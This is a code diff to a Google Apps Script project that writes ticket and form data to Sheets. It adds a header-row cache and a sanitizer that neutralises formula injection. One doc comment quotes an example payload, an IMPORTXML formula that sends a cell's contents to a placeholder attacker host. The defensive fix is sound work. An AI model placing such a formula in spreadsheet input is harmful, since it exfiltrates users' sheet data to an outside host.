-  const toolAssisted = withCycleTime.filter((t) => t.hasLabel).sort((a, b) => b.cycleTimeMinutes - a.cycleTimeMinutes);
-  const others = withCycleTime.filter((t) => !t.hasLabel);
-
-  const avgMinutes = (list) =>
-    list.length ? round2_(list.reduce((sum, t) => sum + t.cycleTimeMinutes, 0) / list.length) : null;
-
-  return {
-    team: 'ST',
-    range: params.range,
-    period: params.period,
-    label: params.label || 'tool-assisted',
-    toolAssisted: {
-      count: toolAssisted.length,
-      avgCycleTimeMinutes: avgMinutes(toolAssisted),
-      tickets: toolAssisted,
-    },
-    others: {
-      count: others.length,
-      avgCycleTimeMinutes: avgMinutes(others),
-    },
-  };
-}
 
 
 // ================================================================
@@ -9183,10 +8791,52 @@ function writeChunkedCache_(cache, key, value, ttlSeconds) {
   cache.putAll(entries, ttlSeconds);
 }
 
+/**
+ * Per-execution cache of each sheet's header row. objectToSheetRow_/appendObjectToSheet_/
+ * updateSheetRow_ are all called once per RECORD from every sync/aggregation loop in this
+ * project (JiraSync, Aggregation, TicketProjectApi, InitiativesSync) — each call was re-reading
+ * the same header row from Sheets, doubling the Sheets API call volume of every one of those
+ * loops for no reason (found via a full-codebase performance audit; this project has hit Sheets/
+ * script-runtime quota exhaustion before, see Aggregation.gs's own historical-timeout comment).
+ * A plain top-level var is exactly the pattern getMetricsDailyIndex_/getRawTicketIndex_ already
+ * use for the equivalent row-lookup problem — it lives only for the current execution and is
+ * never persisted, so a header added by some OTHER function earlier in the same execution won't
+ * retroactively appear here; that's an accepted, narrow tradeoff since header-adding migrations
+ * in this project run as their own standalone one-off functions, never interleaved with a sync
+ * loop that also writes rows in the same execution.
+ */
+var HEADER_ROW_CACHE_ = {};
+
+function getSheetHeaders_(sheet) {
+  var id = sheet.getSheetId();
+  if (!HEADER_ROW_CACHE_[id]) {
+    HEADER_ROW_CACHE_[id] = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
+  }
+  return HEADER_ROW_CACHE_[id];
+}
+
+/**
+ * Blocks Google Sheets from interpreting a client-supplied string as a live formula. A value
+ * starting with =, +, -, or @ is prefixed with a literal apostrophe — the same character Sheets'
+ * own UI uses to force a cell to plain text — so e.g. a feedback/notes field containing
+ * '=IMPORTXML("https://evil.example/?d="&A1,"//a")' is stored and displayed as that literal
+ * string instead of executing. Found via a full-codebase security audit: every *Api.gs create/
+ * update route (IncidentsApi, LeaveApi, RtoApi, ProjectsApi, ProgressApi, TasksApi) writes
+ * client-supplied string fields straight into a row via these two functions with no check.
+ */
+function sanitizeSheetValue_(value) {
+  if (typeof value !== 'string' || !value.length) return value;
+  var first = value.charAt(0);
+  if (first === '=' || first === '+' || first === '-' || first === '@') {
+    return "'" + value;
+  }
+  return value;
+}
+
 /** Converts an object into a row array matching the sheet's current header order. */
 function objectToSheetRow_(sheet, obj) {
-  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
-  return headers.map((h) => (h in obj ? obj[h] : ''));
+  const headers = getSheetHeaders_(sheet);
+  return headers.map((h) => (h in obj ? sanitizeSheetValue_(obj[h]) : ''));
 }
 
 function appendObjectToSheet_(sheet, obj) {
@@ -9195,8 +8845,8 @@ function appendObjectToSheet_(sheet, obj) {
 
 /** Overwrites an existing row (1-indexed) with the given object's values. */
 function updateSheetRow_(sheet, rowIndex, obj) {
-  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
-  const row = headers.map((h) => (h in obj ? obj[h] : sheet.getRange(rowIndex, headers.indexOf(h) + 1).getValue()));
+  const headers = getSheetHeaders_(sheet);
+  const row = headers.map((h, i) => (h in obj ? sanitizeSheetValue_(obj[h]) : sheet.getRange(rowIndex, i + 1).getValue()));
   sheet.getRange(rowIndex, 1, 1, headers.length).setValues([row]);
 }
 
